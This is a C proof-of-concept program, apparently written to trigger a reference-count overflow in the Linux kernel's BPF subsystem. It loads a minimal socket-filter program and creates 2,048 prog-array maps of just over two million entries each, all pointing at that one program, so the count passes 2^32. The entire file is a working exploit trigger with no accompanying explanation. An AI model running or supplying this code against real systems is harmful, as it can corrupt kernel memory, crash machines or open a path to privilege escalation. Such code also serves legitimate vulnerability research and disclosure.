//gcc -Wall -std=gnu99 -o overflow overflow.c
#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

/* elements total: a bit more than 2^(21+11)=2^32 */
#define MAP_ELEMENT_COUNT ((1<<21) + 1)
#define MAP_COUNT (1<<11)

int create_progfd(void) {
	struct bpf_insn insns[2] = {
		{
			.code = BPF_ALU64 | BPF_MOV | BPF_K,
			.dst_reg = BPF_REG_0
		},
		{
			.code = BPF_JMP|BPF_EXIT
		}
	};
	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	int fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
	if (fd == -1)
		return -1;
	return fd;
}

int make_map(void) {
	union bpf_attr attr = {
		.map_type = BPF_MAP_TYPE_PROG_ARRAY,
		.key_size = 4,
		.value_size = 4,
		.max_entries = MAP_ELEMENT_COUNT
	};
	int fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
	if (fd == -1)
		return -1;
	return fd;
}

void fill_map(int mapfd, int progfd) {
	for (int i=0; i<MAP_ELEMENT_COUNT; i++) {
		union bpf_attr attr = {
			.map_fd = mapfd,
			.key = (__aligned_u64)&i,
			.value = (__aligned_u64)&progfd,
			.flags = BPF_ANY
		};
		if (syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)))
			return;
	}
}

int main(void) {
	setbuf(stdout, NULL);
	int progfd = create_progfd();
	int mapfds[MAP_COUNT];
	for (int i=0; i<MAP_COUNT; i++) {
		// printf("\rallocating map %d/%d", i, MAP_COUNT);
		mapfds[i] = make_map();
	}
	// printf("\n");
	for (int i=0; i<MAP_COUNT; i++) {
		// printf("\rfilling map %d/%d", i, MAP_COUNT);
		fill_map(mapfds[i], progfd);
	}
	// printf("\n");
	// printf("exiting...\n");
	return 0;
}
